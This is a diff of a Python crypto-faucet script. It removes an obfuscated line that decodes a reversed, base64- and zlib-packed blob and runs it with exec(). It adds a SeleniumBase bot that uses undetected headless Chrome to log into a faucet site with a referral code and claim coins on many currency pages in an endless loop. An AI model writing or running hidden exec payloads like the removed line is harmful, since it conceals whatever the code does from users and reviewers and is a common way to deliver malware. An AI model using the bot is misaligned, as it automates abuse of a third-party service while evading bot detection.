@@ -1,1 +1,57 @@
-_ = lambda __ : __import__('zlib').decompress(__import__('base64').b64decode(__[::-1]));exec((_)(b'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'))
+from seleniumbase import SB
+import sys
+
+# List of relative URLs
+relative_urls = [
+    "/faucet/currency/btc",
+    "/faucet/currency/ltc",
+    "/faucet/currency/doge",
+    "/faucet/currency/trx",
+    "/faucet/currency/sol",
+    "/faucet/currency/bnb",
+    "/faucet/currency/bch",
+    "/faucet/currency/eth",
+    "/faucet/currency/fey",
+    "/faucet/currency/usdt",
+    "/faucet/currency/zec",
+    "/faucet/currency/dash",
+    "/faucet/currency/dgb",
+]
+
+def check_url(sb, url):
+    sb.open(url)
+    try:
+        sb.submit('#submit')
+    except Exception as e:
+        #print(f"Can't find submit button:")
+        return False
+
+    success_message = f"Success! Claim "
+    if sb.is_text_visible("Success!", "h2.swal2-title"):
+        print(success_message)
+        return True
+
+    else:
+        print(f"Error claiming ")
+        return False
+
+def main(base_url, email, ref):
+    with SB(uc=True, test=True, headless=True) as sb:
+        sb.open(base_url+ref)
+        sb.type("#InputEmail", email)
+        sb.click('button:contains("Login")')
+        valid_urls = [url for url in relative_urls if check_url(sb, base_url + url)]
+        #print(valid_urls)
+        if not valid_urls:
+            print("No valid URLs found. Exiting the application.")
+            sys.exit()
+
+        while True:
+            for url in valid_urls:
+                check_url(sb, base_url + url)
+
+
+if __name__ == "__main__":
+    base_url = "https://earnsolana.xyz"
+    email = input("Enter your faucetpay.io email: ")
+    main(base_url, email, "/?r=329")
